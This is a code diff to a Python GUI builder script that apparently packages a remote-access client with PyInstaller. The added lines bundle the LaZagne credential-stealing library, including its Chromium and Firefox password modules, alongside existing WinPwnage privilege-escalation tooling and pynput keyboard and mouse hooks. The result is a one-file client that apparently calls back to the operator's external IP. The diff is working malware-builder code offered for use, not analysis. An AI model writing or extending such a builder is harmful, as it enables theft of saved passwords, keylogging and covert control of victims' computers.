@@ -26,6 +26,23 @@ import certifi
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
 
 from src.definitions import platforms
+import src.helper as helper
+
+# add lazagne to path and check for supported platform
+if platforms.OS == platforms.DARWIN:
+    helper.init_submodule("laZagne/Mac")
+elif platforms.OS == platforms.LINUX:
+    helper.init_submodule("laZagne/Linux")
+elif platforms.OS == platforms.WINDOWS:
+    helper.init_submodule("laZagne/Windows")
+else:
+    tkinter.messagebox.showerror("Error", f"Platform not supported.")
+    sys.exit(0)
+
+from lazagne.config.manage_modules import get_modules_names as lazagne_get_modules_names
+from lazagne.softwares.browsers.chromium_browsers import \
+    chromium_based_module_location as lazagne_chromium_based_module_location
+from lazagne.softwares.browsers.firefox_browsers import mozilla_module_location as lazagne_mozilla_module_location
 
 
 def null_callback():
@@ -47,7 +64,8 @@ def get_local_ip():
 
 
 def get_external_ip():
-    _request = urllib.request.urlopen("https://checkip.amazonaws.com", context=ssl.create_default_context(cafile=certifi.where()))
+    _request = urllib.request.urlopen("https://checkip.amazonaws.com",
+                                      context=ssl.create_default_context(cafile=certifi.where()))
     return _request.read().decode("utf-8")
 
 
@@ -247,12 +265,39 @@ class Setup:
                     if it.path.endswith("WinPwnage") and platforms.OS != platforms.WINDOWS:
                         continue
 
-                    paths += f"--path={it.path} "
+                    if it.path.endswith("LaZagne"):
+                        if platforms.OS == platforms.WINDOWS:
+                            paths += f"--path=\"{it.path}\\Windows\" "
+                        elif platforms.OS == platforms.DARWIN:
+                            paths += f"--path=\"{it.path}\\Mac\" "
+                        elif platforms.OS == platforms.LINUX:
+                            paths += f"--path=\"{it.path}\\Linux\" "
 
-            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {paths} --onefile -y " \
-                          f"--clean --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 " \
-                          f"--exclude-module FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter " \
-                          f"--exclude-module tkinter --exclude-module Tkinter"
+                        continue
+
+                    paths += f"--path=\"{it.path}\" "
+
+            hidden_imports = ""
+
+            lazagne_hidden = lazagne_get_modules_names() + [lazagne_mozilla_module_location,
+                                                            lazagne_chromium_based_module_location]
+            hidden_imports_list = [package_name for package_name, module_name in lazagne_hidden]
+            hidden_imports_list += ["pynput.keyboard._win32", "pynput.mouse._win32"]
+
+            for _import in hidden_imports_list:
+                hidden_imports += f"--hidden-import={_import} "
+
+            binary = ""
+            if platforms.OS == platforms.WINDOWS:
+                msvcp100dll = f"{os.environ['WINDIR']}\\System32\\msvcp100.dll"
+                msvcr100dll = f"{os.environ['WINDIR']}\\System32\\msvcr100.dll"
+
+                if os.path.exists(msvcp100dll) and os.path.exists(msvcr100dll):
+                    binary += f"--add-binary={msvcp100dll};msvcp100.dll --add-binary={msvcr100dll};msvcr100.dll"
+
+            command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {paths} {binary} {hidden_imports}" \
+                          f"--onefile -y --clean --exclude-module FixTk --exclude-module tcl " \
+                          f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter"
 
             def run_command():
                 self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -296,9 +341,9 @@ class Setup:
         if value == "External IP":
             self.host_widg["text"] = self.external_ip
         elif value == "Local IP":
-            self.host_widg["text"] = self.local_ip    
+            self.host_widg["text"] = self.local_ip
         elif value == "Loopback":
-            self.host_widg["text"] = self.loopback_ip         
+            self.host_widg["text"] = self.loopback_ip
 
 
 if __name__ == "__main__":
